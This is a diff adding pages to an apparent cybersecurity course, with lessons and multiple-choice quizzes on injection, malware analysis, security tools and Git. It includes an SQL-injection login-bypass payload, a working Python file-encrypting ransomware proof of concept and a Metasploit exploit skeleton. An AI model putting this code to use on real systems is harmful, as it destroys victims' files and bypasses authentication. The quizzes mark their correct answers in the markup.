+                    <input type="radio" name="task24" value="correct"> A vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users.<br>
+                    <input type="radio" name="task24" value="wrong"> A method for encrypting data transmitted over the internet.<br>
+                    <input type="radio" name="task24" value="wrong"> A technique used to optimize web page loading speed.<br>
+                    <span class="feedback" id="q24-feedback"></span>
+                </form>
+                <div class="actions">
+                    <button class="check">Check answers</button>
+                    <div class="hint-p24 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                    <div class="nextsection"><strong>Next >></strong></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    </article>
+
+    
+    <article>
+        <h3 course-id="p25"  class="locked">8.2 SQL Injection</h3>
+        <div class="theory p25">
+            <div class="course-container">
+                <h4>Definition:</h4>
+                <p>SQL Injection is a type of injection attack that allows attackers to execute arbitrary SQL queries against a database. This occurs when user inputs are not properly sanitized before being included in SQL queries.</p>
+
+                <h4>Identifying SQL Injection Vulnerabilities:</h4>
+                <ul>
+                    <li>Look for user input fields (e.g., login forms, search boxes) where SQL queries are constructed directly from user inputs.</li>
+                    <li>Use tools like SQLMap to automate the detection of SQL injection vulnerabilities.</li>
+                </ul>
+
+                <h4>Example of a Basic SQL Injection Attack:</h4>
+                <pre><code class="language-sql">
+' OR '1'='1'; --
+                </code></pre>
+                <p>This payload can manipulate a query to bypass authentication by always evaluating to true.</p>
+
+                <h4>Preventing SQL Injection:</h4>
+                <ul>
+                    <li><strong>Prepared Statements:</strong> Use parameterized queries or prepared statements to separate SQL code from data.</li>
+                    <li><strong>Input Sanitization:</strong> Validate and sanitize user inputs to ensure they do not contain SQL control characters.</li>
+                    <li><strong>Least Privilege Principle:</strong> Restrict database user permissions to limit potential damage from SQL injection attacks.</li>
+                </ul>
+            <div class="next"><strong>Next >></strong></div>
+        </div>
+
+        
+        <div class="task" task-id="p25">
+            <div class="question">
+                <label for="q25"><h5>Question:</h5> What is SQL Injection?</label><br>
+                <form id='q25' class="task-form">
+                    <input type="radio" name="task25" value="correct"> A type of injection attack that allows attackers to execute arbitrary SQL queries against a database.<br>
+                    <input type="radio" name="task25" value="wrong"> A method for securing web applications against attacks.<br>
+                    <input type="radio" name="task25" value="wrong"> A technique used for optimizing database performance.<br>
+                    <span class="feedback" id="q25-feedback"></span>
+                </form>
+                <div class="actions">
+                    <button class="check">Check answers</button>
+                    <div class="hint-p25 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                    <div class="nextsection"><strong>Next >></strong></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    </article>
+
+    
+    <article>
+        <h3 course-id="p26"  class="locked">8.3 Secure API Development</h3>
+        <div class="theory p26">
+            <div class="course-container">
+                <h4>Definition:</h4>
+                <p>APIs (Application Programming Interfaces) facilitate communication between different software applications. Ensuring the security of APIs is crucial, as they can be targets for attackers seeking to exploit vulnerabilities.</p>
+
+                <h4>Key Principles for Secure API Development:</h4>
+                <ul>
+                    <li><strong>Authentication:</strong> Implement strong authentication methods (e.g., OAuth 2.0, JWT) to ensure that only authorized users can access the API.</li>
+                    <li><strong>Input Validation:</strong> Validate all inputs to prevent injection attacks and ensure only valid data is processed.</li>
+                    <li><strong>Encryption:</strong> Use HTTPS to encrypt data in transit, protecting sensitive information from interception.</li>
+                    <li><strong>Rate Limiting:</strong> Implement rate limiting to prevent abuse and denial-of-service attacks by limiting the number of requests a user can make in a given timeframe.</li>
+                </ul>
+
+                <h4>Example of Secure API Development (Flask with JWT):</h4>
+                <pre><code class="language-python">
+from flask import Flask, request, jsonify
+from flask_jwt_extended import JWTManager, create_access_token
+
+app = Flask(__name__)
+app.config['JWT_SECRET_KEY'] = 'your_jwt_secret_key'
+jwt = JWTManager(app)
+
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.json.get('username')
+    password = request.json.get('password')
+    # Validate credentials (not shown)
+    access_token = create_access_token(identity=username)
+    return jsonify(access_token=access_token)
+
+if __name__ == '__main__':
+    app.run()
+                </code></pre>
+
+                <h4>Importance:</h4>
+                <p>Secure API development helps protect sensitive data and ensures that applications remain resilient against various attacks. APIs are often the backbone of modern web applications, making their security essential for maintaining user trust and data integrity.</p>
+            <div class="next"><strong>Next >></strong></div>
+        </div>
+
+        
+        <div class="task" task-id="p26">
+            <div class="question">
+                <label for="q26"><h5>Question:</h5> Why is secure API development important?</label><br>
+                <form id='q26' class="task-form">
+                    <input type="radio" name="task26" value="correct"> It helps protect sensitive data and ensures applications remain resilient against various attacks.<br>
+                    <input type="radio" name="task26" value="wrong"> It is only important for large-scale applications.<br>
+                    <input type="radio" name="task26" value="wrong"> It simplifies the API design process.<br>
+                    <span class="feedback" id="q26-feedback"></span>
+                </form>
+                <div class="actions">
+                    <button class="check">Check answers</button>
+                    <div class="hint-p26 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                    <div class="nextsection"><strong>Next >></strong></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    </article>
+</section>
+
+
+
+<section id="malware-analysis-development">
+    <h2>9. Malware Analysis and Development</h2>
+
+    <article>
+        <h3 course-id="p27"  class="locked">9.1 Static Analysis</h3>
+        <div class="theory p27">
+            <div class="course-container">
+                <h4>Definition:</h4>
+                <p>Static analysis involves examining the binary or source code of malware without executing it. The goal is to understand its functionality, structure, and potential threats by disassembling or decompiling the code.</p>
+
+                <h4>Techniques:</h4>
+                <ul>
+                    <li><strong>Disassembly:</strong> Converting the malware’s binary code into assembly code to understand its logic and identify key functions. Tools like IDA Pro, Ghidra, and Radare2 are commonly used.</li>
+                    <li><strong>String Analysis:</strong> Extracting human-readable strings from the binary using tools like `strings` in Unix or Sysinternals' Strings to find clues about functionality (e.g., URLs, file paths, registry keys).</li>
+                    <li><strong>Examining Metadata:</strong> Reviewing file properties such as PE headers (on Windows executables) or ELF headers (on Linux binaries) for information about the compiler, libraries, and potential weaknesses.</li>
+                    <li><strong>Reverse Engineering:</strong> If the source code is unavailable, reverse engineering techniques can be employed to gain deeper insights into the malware's behavior and logic.</li>
+                </ul>
+
+                <h4>Example (Extracting Strings from a Binary):</h4>
+                <pre><code class="language-bash">
+strings malware_sample.bin
+                </code></pre>
+
+                <h4>Importance:</h4>
+                <ul>
+                    <li>Static analysis helps identify what a piece of malware might do without running it, crucial for understanding its capabilities in a safe environment.</li>
+                    <li>Reveals clues about the malware’s origin, intent, or potential vulnerabilities.</li>
+                </ul>
+            <div class="next"><strong>Next >></strong></div>
+        </div>
+
+        
+        <div class="task" task-id="p27">
+            <div class="question">
+                <label for="q27"><h5>Question:</h5> What is the primary goal of static analysis?</label><br>
+                <form id='q27' class="task-form">
+                    <input type="radio" name="task27" value="correct"> To understand the functionality and structure of malware without executing it.<br>
+                    <input type="radio" name="task27" value="wrong"> To run the malware in a controlled environment.<br>
+                    <input type="radio" name="task27" value="wrong"> To encrypt files in a target directory.<br>
+                    <span class="feedback" id="q27-feedback"></span>
+                </form>
+                <div class="actions">
+                    <button class="check">Check answers</button>
+                    <div class="hint-p27 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                    <div class="nextsection"><strong>Next >></strong></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    </article>
+
+    
+    <article>
+        <h3 course-id="p28"  class="locked">9.2 Dynamic Analysis</h3>
+        <div class="theory p28">
+            <div class="course-container">
+                <h4>Definition:</h4>
+                <p>Dynamic analysis involves executing malware in a controlled environment (e.g., sandbox or virtual machine) to observe its behavior. This allows analysts to monitor how malware interacts with the system, network, and files.</p>
+
+                <h4>Techniques:</h4>
+                <ul>
+                    <li><strong>Sandboxing:</strong> Running the malware in a sandboxed environment to contain its execution while monitoring its actions (file manipulations, network requests, registry changes, etc.). Tools like Cuckoo Sandbox are widely used.</li>
+                    <li><strong>Process Monitoring:</strong> Tracking process creation, API calls, and memory usage while the malware runs. Tools like Process Monitor (ProcMon) and Sysmon help capture detailed system events.</li>
+                    <li><strong>Network Monitoring:</strong> Using tools like Wireshark to monitor network traffic generated by the malware, which can reveal command-and-control (C2) servers or data exfiltration attempts.</li>
+                    <li><strong>Script Automation:</strong> Python or Bash scripts can automate dynamic analysis, such as monitoring certain directories, processes, or network interfaces for suspicious activity.</li>
+                </ul>
+
+                <h4>Example (Using Python to Monitor File Changes):</h4>
+                <pre><code class="language-python">
+import os
+import time
+
+path_to_monitor = "/tmp/malware_test"
+before = dict([(f, None) for f in os.listdir(path_to_monitor)])
+
+while True:
+    time.sleep(10)
+    after = dict([(f, None) for f in os.listdir(path_to_monitor)])
+    added = [f for f in after if f not in before]
+    removed = [f for f in before if f not in after]
+    if added: print(f"Added: {', '.join(added)}")
+    if removed: print(f"Removed: {', '.join(removed)}")
+    before = after
+                </code></pre>
+
+                <h4>Importance:</h4>
+                <ul>
+                    <li>Dynamic analysis provides a real-time understanding of how malware behaves once it infiltrates a system, revealing its true intent and potential impact.</li>
+                    <li>Useful for determining the actions malware takes when evading static defenses or performing sophisticated attacks.</li>
+                </ul>
+           <div class="next"><strong>Next >></strong></div>
+        </div>
+
+        
+        <div class="task" task-id="p28">
+            <div class="question">
+                <label for="q28"><h5>Question:</h5> What is the primary benefit of dynamic analysis?</label><br>
+                <form id='q28' class="task-form">
+                    <input type="radio" name="task28" value="correct"> It provides real-time understanding of how malware behaves when executed.<br>
+                    <input type="radio" name="task28" value="wrong"> It allows for examining the code without executing it.<br>
+                    <input type="radio" name="task28" value="wrong"> It simplifies the code writing process for malware.<br>
+                    <span class="feedback" id="q28-feedback"></span>
+                </form>
+                <div class="actions">
+                    <button class="check">Check answers</button>
+                    <div class="hint-p28 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                    <div class="nextsection"><strong>Next >></strong></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    </article>
+
+    
+    <article>
+        <h3 course-id="p29"  class="locked">9.3 Creating Proof-of-Concept Malware</h3>
+        <div class="theory p29">
+            <div class="course-container">
+                <h4>Definition:</h4>
+                <p>Ethical hackers or security researchers may develop proof-of-concept (PoC) malware to better understand attack techniques, test security defenses, or demonstrate vulnerabilities in software or systems.</p>
+
+                <h4>Key Concepts:</h4>
+                <ul>
+                    <li><strong>Ethical Intent:</strong> PoC malware is written solely for research, testing, or education. It is never meant to harm or be used for illegal purposes.</li>
+                    <li><strong>Testing Vulnerabilities:</strong> Researchers use PoC malware to simulate real attacks and demonstrate how vulnerabilities can be exploited, helping developers patch weaknesses in their systems.</li>
+                </ul>
+
+                <h4>Common Languages for PoC Malware:</h4>
+                <ul>
+                    <li><strong>C/C++:</strong> Low-level programming for writing malware that interacts closely with system internals, ideal for rootkits, keyloggers, or exploit development.</li>
+                    <li><strong>Python:</strong> Often used for scripting malware, network attacks, or automating attacks. Python’s libraries (e.g., socket, subprocess) make it a flexible choice for malware prototypes.</li>
+                </ul>
+
+                <h4>Example (Simple Python Ransomware PoC):</h4>
+                <pre><code class="language-python">
+import os
+from cryptography.fernet import Fernet
+
+# Generate a key and save it
+key = Fernet.generate_key()
+with open("ransom_key.key", "wb") as key_file:
+    key_file.write(key)
+
+# Encrypt files in a directory
+cipher = Fernet(key)
+for root, dirs, files in os.walk("/target_directory"):
+    for file in files:
+        file_path = os.path.join(root, file)
+        with open(file_path, "rb") as f:
+            data = f.read()
+        encrypted_data = cipher.encrypt(data)
+        with open(file_path, "wb") as f:
+            f.write(encrypted_data)
+
+print("Files encrypted. Send ransom for key.")
+                </code></pre>
+
+                <h4>Importance:</h4>
+                <ul>
+                    <li>PoC malware enables security researchers to demonstrate potential threats in a controlled, ethical way, raising awareness and encouraging the development of better defenses.</li>
+                    <li>Writing PoC malware helps researchers understand how attackers think, allowing them to proactively defend against emerging threats.</li>
+                </ul>
+            <div class="next"><strong>Next >></strong></div>
+        </div>
+
+        
+        <div class="task" task-id="p29">
+            <div class="question">
+                <label for="q29"><h5>Question:</h5> What is the primary purpose of creating proof-of-concept malware?</label><br>
+                <form id='q29' class="task-form">
+                    <input type="radio" name="task29" value="correct"> To understand attack techniques and test security defenses ethically.<br>
+                    <input type="radio" name="task29" value="wrong"> To create real threats that can harm systems.<br>
+                    <input type="radio" name="task29" value="wrong"> To develop advanced malware for criminal activities.<br>
+                    <span class="feedback" id="q29-feedback"></span>
+                </form>
+                <div class="actions">
+                    <button class="check">Check answers</button>
+                    <div class="hint-p29 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                    <div class="nextsection"><strong>Next >></strong></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    </article>
+</section>
+
+
+
+<section id="popular-cybersecurity-tools">
+    <h2>10. Popular Cybersecurity Tools that Require Programming Knowledge</h2>
+
+    
+    <article>
+        <h3 course-id="p30"  class="locked">10.1 Metasploit Framework</h3>
+        <div class="theory p30">
+            <div class="course-container">
+                <h4>Overview:</h4>
+                <p>The Metasploit Framework is a powerful and widely used open-source penetration testing tool that helps security professionals identify, exploit, and validate vulnerabilities in a system. It provides a robust platform for developing and deploying exploits, payloads, and auxiliary modules.</p>
+                
+                <h4>Programming Language:</h4>
+                <p>Written in Ruby, Metasploit allows users to modify existing modules or create custom exploits and payloads.</p>
+
+                <h4>Key Features:</h4>
+                <ul>
+                    <li><strong>Exploit Development:</strong> Write custom exploits to target specific vulnerabilities in software or networks.</li>
+                    <li><strong>Payload Generation:</strong> Create custom payloads to execute specific actions once an exploit is successful.</li>
+                    <li><strong>Metasploit Modules:</strong> Modular architecture allowing for custom modules (e.g., exploits, payloads, encoders) to extend functionality.</li>
+                </ul>
+
+                <h4>Example (Writing a Simple Custom Exploit in Ruby):</h4>
+                <pre><code class="language-ruby">
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+    include Msf::Exploit::Remote::Tcp
+
+    def initialize(info = {})
+        super(update_info(info,
+            'Name'           => 'Custom TCP Exploit',
+            'Description'    => %q{
+                Example of a custom exploit.
+            },
+            'License'        => MSF_LICENSE,
+            'Author'         => ['Your Name'],
+            'Payload'        =>
+                {
+                    'Space' => 400,
+                    'BadChars' => "\x00",
+                }
+        ))
+
+        register_options(
+            [
+                Opt::RPORT(1234)
+            ], self.class)
+    end
+
+    def exploit
+        connect
+        sock.put(payload.encoded)
+        disconnect
+    end
+end
+                </code></pre>
+
+                <h4>Importance:</h4>
+                <p>Metasploit is essential for penetration testers and security researchers. Ruby programming knowledge enables users to customize and extend the tool to meet specific security needs.</p>
+           <div class="next"><strong>Next >></strong></div>
+        </div>
+
+        
+        <div class="task" task-id="p30">
+            <div class="question">
+                <label for="q30"><h5>Question:</h5> What programming language is the Metasploit Framework written in?</label><br>
+                <form id='q30' class="task-form">
+                    <input type="radio" name="task30" value="correct"> Ruby<br>
+                    <input type="radio" name="task30" value="wrong"> Python<br>
+                    <input type="radio" name="task30" value="wrong"> Java<br>
+                    <span class="feedback" id="q30-feedback"></span>
+                </form>
+                <div class="actions">
+                    <button class="check">Check answers</button>
+                    <div class="hint-p30 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                    <div class="nextsection"><strong>Next >></strong></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    </article>
+
+   
+    <article>
+        <h3 course-id="p31"  class="locked">10.2 Burp Suite</h3>
+        <div class="theory p31">
+            <div class="course-container">
+                <h4>Overview:</h4>
+                <p>Burp Suite is a popular tool for web vulnerability scanning and security testing, especially for identifying vulnerabilities like SQL injection, cross-site scripting (XSS), and other web application flaws. Its extensibility is one of its key features.</p>
+                
+                <h4>Programming Language:</h4>
+                <p>Written in Java, Burp Suite allows users to extend its functionality by writing custom plugins, often through the Burp Extender API.</p>
+
+                <h4>Key Features:</h4>
+                <ul>
+                    <li><strong>Custom Plugins:</strong> Write custom Burp plugins using Java, Python (via Jython), or Ruby for automation and enhanced scanning capabilities.</li>
+                    <li><strong>Automated Scanning:</strong> Build custom scanning features to enhance vulnerability detection using the Burp API.</li>
+                </ul>
+
+                <h4>Example (Writing a Simple Burp Extension in Python using Jython):</h4>
+                <pre><code class="language-python">
+from burp import IBurpExtender, IScannerCheck
+
+class BurpExtender(IBurpExtender, IScannerCheck):
+    def registerExtenderCallbacks(self, callbacks):
+        print("Custom extension loaded")
+        callbacks.registerScannerCheck(self)
+
+    def doPassiveScan(self, baseRequestResponse):
+        print("Running custom scan...")
+        return []
+                </code></pre>
+
+                <h4>Importance:</h4>
+                <p>Knowledge of Java or Python is vital for creating custom plugins that expand Burp Suite’s functionality, invaluable for advanced web application security assessments.</p>
+            <div class="next"><strong>Next >></strong></div>
+        </div>
+
+        
+        <div class="task" task-id="p31">
+            <div class="question">
+                <label for="q31"><h5>Question:</h5> What is a key feature of Burp Suite?</label><br>
+                <form id='q31' class="task-form">
+                    <input type="radio" name="task31" value="correct"> Extensibility through custom plugins.<br>
+                    <input type="radio" name="task31" value="wrong"> Built-in antivirus capabilities.<br>
+                    <input type="radio" name="task31" value="wrong"> Hardware firewall configuration.<br>
+                    <span class="feedback" id="q31-feedback"></span>
+                </form>
+                <div class="actions">
+                    <button class="check">Check answers</button>
+                    <div class="hint-p31 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                    <div class="nextsection"><strong>Next >></strong></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    </article>
+
+    
+    <article>
+        <h3 course-id="p32"  class="locked">10.3 Wireshark and TShark</h3>
+        <div class="theory p32">
+            <div class="course-container">
+                <h4>Overview:</h4>
+                <p>Wireshark is one of the most popular tools for packet capture and analysis, allowing network administrators and security professionals to inspect network traffic for troubleshooting and vulnerability discovery. TShark is the command-line version of Wireshark.</p>
+
+                <h4>Programming Language:</h4>
+                <p>Wireshark can be extended using the Lua scripting language to create custom dissectors and automate packet analysis.</p>
+
+                <h4>Key Features:</h4>
+                <ul>
+                    <li><strong>Custom Protocol Dissectors:</strong> Use Lua scripts to dissect custom or proprietary network protocols that are not natively supported by Wireshark.</li>
+                    <li><strong>Automating Analysis:</strong> Write Lua scripts to automate packet analysis, filtering traffic based on specific criteria.</li>
+                </ul>
+
+                <h4>Example (Writing a Lua Script for Wireshark):</h4>
+                <pre><code class="language-lua">
+local my_protocol = Proto("my_protocol", "My Custom Protocol")
+
+function my_protocol.dissector(buffer, pinfo, tree)
+    pinfo.cols.protocol = "MY_PROTOCOL"
+    local subtree = tree:add(my_protocol, buffer(), "My Protocol Data")
+    subtree:add(buffer(0,4), "Data: " .. buffer(0,4):string())
+end
+
+local tcp_table = DissectorTable.get("tcp.port")
+tcp_table:add(12345, my_protocol)
+                </code></pre>
+
+                <h4>Importance:</h4>
+                <p>Knowledge of network protocols and Lua scripting allows users to customize and automate packet analysis, providing deeper insights into network traffic and potential vulnerabilities.</p>
+            <div class="next"><strong>Next >></strong></div>
+        </div>
+
+        
+        <div class="task" task-id="p32">
+            <div class="question">
+                <label for="q32"><h5>Question:</h5> What scripting language is used to extend Wireshark?</label><br>
+                <form id='q32' class="task-form">
+                    <input type="radio" name="task32" value="correct"> Lua<br>
+                    <input type="radio" name="task32" value="wrong"> Ruby<br>
+                    <input type="radio" name="task32" value="wrong"> Java<br>
+                    <span class="feedback" id="q32-feedback"></span>
+                </form>
+                <div class="actions">
+                    <button class="check">Check answers</button>
+                    <div class="hint-p32 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                    <div class="nextsection"><strong>Next >></strong></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    </article>
+
+    
+    <article>
+        <h3  course-id="p33" class="locked">10.4 Nmap Scripting Engine (NSE)</h3>
+        <div class="theory p33">
+            <div class="course-container">
+                <h4>Overview:</h4>
+                <p>Nmap is a widely-used network scanning tool for discovering hosts, services, and vulnerabilities. The Nmap Scripting Engine (NSE) allows users to write custom scripts to extend Nmap’s functionality, providing additional automation for scanning and vulnerability detection.</p>
+
+                <h4>Programming Language:</h4>
+                <p>Lua is used to write Nmap scripts.</p>
+
+                <h4>Key Features:</h4>
+                <ul>
+                    <li><strong>Custom Scripts:</strong> Write scripts to automate tasks such as network discovery, vulnerability scanning, and service enumeration.</li>
+                    <li><strong>Existing Scripts:</strong> Nmap comes with many pre-built scripts that can be extended or modified to meet specific needs.</li>
+                </ul>
+
+                <h4>Example (Writing a Simple Nmap Script in Lua):</h4>
+                <pre><code class="language-lua">
+description = [[
+    A simple Nmap script to detect custom service on port 8080.
+]]
+
+portrule = function(host, port)
+    return port.number == 8080
+end
+
+action = function(host, port)
+    return "Custom service detected on port 8080"
+end
+                </code></pre>
+
+                <h4>Importance:</h4>
+                <p>Mastering Lua scripting allows users to create highly customized network scanning scripts that go beyond Nmap’s out-of-the-box capabilities, automating complex security assessments.</p>
+            <div class="next"><strong>Next >></strong></div>
+        </div>
+
+        
+        <div class="task" task-id="p33">
+            <div class="question">
+                <label for="q33"><h5>Question:</h5> What is the purpose of the Nmap Scripting Engine (NSE)?</label><br>
+                <form id='q33' class="task-form">
+                    <input type="radio" name="task33" value="correct"> To extend Nmap's functionality with custom scripts.<br>
+                    <input type="radio" name="tasK33" value="wrong"> To provide a graphical user interface.<br>
+                    <input type="radio" name="task33" value="wrong"> To manage network devices.<br>
+                    <span class="feedback" id="q33-feedback"></span>
+                </form>
+                <div class="actions">
+                    <button class="check">Check answers</button>
+                    <div class="hint-p33 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                    <div class="nextsection"><strong>Next >></strong></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    </article>
+</section>
+
+
+
+
+<section>
+    <h2>11 Using Version Control (e.g., Git)</h2>
+    <article>
+    <h3 course-id="p34" class="locked">11.1 Version Control Overview</h3>
+    <div class="theory p34">
+        <div class="course-container">
+    <p><strong>Definition:</strong> Version control is the practice of tracking and managing changes to code, documents, or other collections of information over time. It allows developers to record the history of their work, collaborate efficiently, and manage multiple versions of a project simultaneously.</p>
+    
+    <h4>Popular Tools:</h4>
+    <ul>
+        <li><strong>Git:</strong> The most widely-used distributed version control system, enabling local and remote repositories to keep track of code changes.</li>
+        <li><strong>GitHub, GitLab, Bitbucket:</strong> Platforms built around Git to provide hosting, collaboration, and additional features like pull requests, issue tracking, and CI/CD integration.</li>
+    </ul>
+    
+    <h4>Importance in Cybersecurity Development:</h4>
+    <ol>
+        <li><strong>Collaboration:</strong> In cybersecurity projects, developers often work in teams to build, test, and refine tools or analyze security codebases. Version control allows multiple contributors to work on different parts of the project simultaneously.</li>
+        <li><strong>Accountability:</strong> By tracking every change, version control enables security audits and accountability. If a vulnerability is introduced in a codebase, it’s possible to trace back the exact change and contributor, which is crucial for secure development practices.</li>
+        <li><strong>Change Management:</strong> In large-scale security projects, where codebases change rapidly, version control ensures that updates are systematically tested and reviewed before being merged into the main project.</li>
+        <li><strong>Backup and Recovery:</strong> By maintaining a complete history of changes, developers can revert to previous versions of the code if security issues, bugs, or errors are introduced.</li>
+    </ol>
+    
+    <h4>Try It Out:</h4>
+    <p>Create a new Git repository on your local machine and initialize it. Add a new file, make some changes, and commit them. Then, check the commit history.</p>
+    <div class="next"><strong>Next >></strong></div>
+</div>
+    
+    <div class="task" task-id="p34">
+        <div class="question">
+            <label for="q34"><h5>Question:</h5> What is the main purpose of version control in software development?</label><br>
+            <form id='q34' class="task-form">
+                <input type="radio" name="task34" value="correct"> To track changes to the code over time.<br>
+                <input type="radio" name="task34" value="wrong"> To eliminate the need for testing.<br>
+                <input type="radio" name="task34" value="wrong"> To manage the project budget.<br>
+                <span class="feedback" id="q34-feedback"></span>
+            </form>
+            <div class="actions">
+                <button class="check">Check answers</button>
+                <div class="hint-p34 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                <div class="nextsection"><strong>Next >></strong></div>
+            </div>
+        </div>
+    </div>
+    </div>
+</article>
+
+<article>
+    <h3 course-id="p35">11.2 Secure Development Workflow</h3>
+    <div class="theory p35">
+        <div class="course-container">
+    <h4>1. Branching for Isolation and Safety</h4>
+    <p><strong>Definition:</strong> Branching allows developers to create isolated environments for specific features, experiments, or bug fixes without affecting the main project. Each branch operates independently, preventing unstable or vulnerable code from disrupting the entire system.</p>
+    
+    <h5>Example Branching Strategy:</h5>
+    <ul>
+        <li><strong>Master/Main Branch:</strong> Contains the stable version of the project, typically ready for deployment.</li>
+        <li><strong>Development Branch:</strong> Used for integration and testing before changes are merged into the main branch.</li>
+        <li><strong>Feature Branches:</strong> Dedicated to individual features, bugs, or security patches.</li>
+    </ul>
+    
+    <h5>Example Git Commands:</h5>
+    <pre><code># Create a new branch for a security patch
+git checkout -b security-patch-branch
+
+# Switch between branches
+git checkout main
+
+# Merge the patch back into the main branch
+git merge security-patch-branch
+    </code></pre>
+
+    <h4>Try It Out:</h4>
+    <p>Create a new branch in your repository, make some changes to a file, and merge that branch back into the main branch.</p>
+    <div class="next"><strong>Next >></strong></div>
+</div>
+
+    <div class="task" task-id="p35">
+        <div class="question">
+            <label for="q35"><h5>Question:</h5> Why is branching important in a collaborative development environment?</label><br>
+            <form id='q35' class="task-form">
+                <input type="radio" name="task35" value="correct"> It allows developers to work on features without affecting the main codebase.<br>
+                <input type="radio" name="task35" value="wrong"> It makes it easier to deploy changes directly to production.<br>
+                <input type="radio" name="task35" value="wrong"> It prevents other developers from accessing the code.<br>
+                <span class="feedback" id="q35-feedback"></span>
+            </form>
+            <div class="actions">
+                <button class="check">Check answers</button>
+                <div class="hint-p35 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                <div class="nextsection"><strong>Next >></strong></div>
+            </div>
+        </div>
+    </div>
+</div>
+</article>
+
+<article>
+    <h3 course-id="p36" class="locked">11.2.1 Commit History and Secure Code Auditing</h3>
+    <div class="theory p36">
+        <div class="course-container">
+    <p><strong>Definition:</strong> Every change made to a codebase is recorded in the form of a commit, along with a timestamp and message describing the change. This helps track who made what changes and why.</p>
+    
+    <p><strong>Code Auditing:</strong> In security-focused projects, commit history is critical for auditing. If a security flaw is discovered, developers can easily investigate when and how it was introduced, enabling targeted fixes.</p>
+    
+    <h5>Example Git Commands:</h5>
+    <pre><code># View the commit history
+git log
+
+# Show changes made in a specific commit
+git show commit_id
+    </code></pre>
+    
+    <h4>Try It Out:</h4>
+    <p>Make several commits in your repository. Use <code>git log</code> to view the history and <code>git show</code> to examine specific commits.</p>
+    <div class="next"><strong>Next >></strong></div>
+    </div>
+
+    <div class="task" task-id="p36">
+        <div class="question">
+            <label for="q36"><h5>Question:</h5> How can commit history assist in auditing code for security vulnerabilities?</label><br>
+            <form id='q36' class="task-form">
+                <input type="radio" name="task36" value="correct"> It allows tracing changes back to their origin.<br>
+                <input type="radio" name="task36" value="wrong"> It eliminates the need for security testing.<br>
+                <input type="radio" name="task36" value="wrong"> It automatically fixes vulnerabilities.<br>
+                <span class="feedback" id="q36-feedback"></span>
+            </form>
+            <div class="actions">
+                <button class="check">Check answers</button>
+                <div class="hint-p36 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                <div class="nextsection"><strong>Next >></strong></div>
+            </div>
+        </div>
+    </div>
+</div>
+</article>
+
+<article>
+    <h3 course-id ="p37" class="locked">11.2.2 Pull Requests and Code Reviews for Security</h3>
+    <div class="theory p37">
+        <div class="course-container">
+    <p><strong>Definition:</strong> Pull requests (or merge requests) are mechanisms used in Git platforms (GitHub, GitLab) to propose, review, and approve changes before they are merged into the main codebase.</p>
+    
+    <h5>Security Benefits:</h5>
+    <ul>
+        <li><strong>Code Review:</strong> Before merging, security experts can review the changes to ensure that no vulnerabilities are introduced. This is essential for ensuring that the code is safe and follows best security practices.</li>
+        <li><strong>Automated Security Scanning:</strong> CI/CD pipelines integrated with Git can automatically run security scans on every pull request to detect vulnerabilities in the code.</li>
+    </ul>
+    
+    <h5>Example Workflow (on GitHub/GitLab):</h5>
+    <ol>
+        <li>Developer opens a pull request after pushing changes to the remote repository.</li>
+        <li>Senior developers or security team members review the code for security issues.</li>
+        <li>Automated tools (e.g., Dependabot, Snyk) check for vulnerabilities or outdated dependencies.</li>
+        <li>If approved, the pull request is merged into the main branch.</li>
+    </ol>
+    
+    <h4>Try It Out:</h4>
+    <p>Create a pull request for a change you made in your branch. Ask a peer to review it and provide feedback.</p>
+    <div class="next"><strong>Next >></strong></div>
+</div>
+    <div class="task" task-id="p37">
+        <div class="question">
+            <label for="q37"><h5>Question:</h5> What is the primary purpose of a pull request in the context of secure software development?</label><br>
+            <form id='q37' class="task-form">
+                <input type="radio" name="task37" value="correct"> To facilitate code reviews and discussions before changes are merged.<br>
+                <input type="radio" name="task37" value="wrong"> To automate the deployment of code changes.<br>
+                <input type="radio" name="task37" value="wrong"> To eliminate the need for testing code.<br>
+                <span class="feedback" id="q37-feedback"></span>
+            </form>
+            <div class="actions">
+                <button class="check">Check answers</button>
+                <div class="hint-p37 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                <div class="nextsection"><strong>Next >></strong></div>
+            </div>
+        </div>
+    </div>
+</div>
+</article>
+
+<article>
+    <h3 course-id="p38" class="locked">11.2.3 Managing Secrets and Sensitive Information</h3>
+        <div class="theory p38">
+            <div class="course-container">
+    <p><strong>Importance:</strong> Storing sensitive information (like API keys, passwords) in version-controlled code can lead to severe security vulnerabilities. Proper management of these secrets is critical in secure development.</p>
+    
+    <h5>Best Practices:</h5>
+    <ul>
+        <li><strong>.gitignore:</strong> Use a <code>.gitignore</code> file to specify files or directories that should not be tracked by Git.</li>
+        <li><strong>Environment Variables:</strong> Store sensitive data in environment variables instead of hardcoding them into the codebase.</li>
+        <li><strong>Secret Management Tools:</strong> Utilize tools like HashiCorp Vault or AWS Secrets Manager for managing and accessing secrets securely.</li>
+    </ul>
+    
+    <h5>Example:</h5>
+    <p>Adding files to <code>.gitignore</code> to prevent accidental inclusion in version control:</p>
+    <pre><code># Add sensitive files to .gitignore
+echo "config/secrets.yml" >> .gitignore
+
+# Ensure git doesn't track the file
+git rm --cached config/secrets.yml
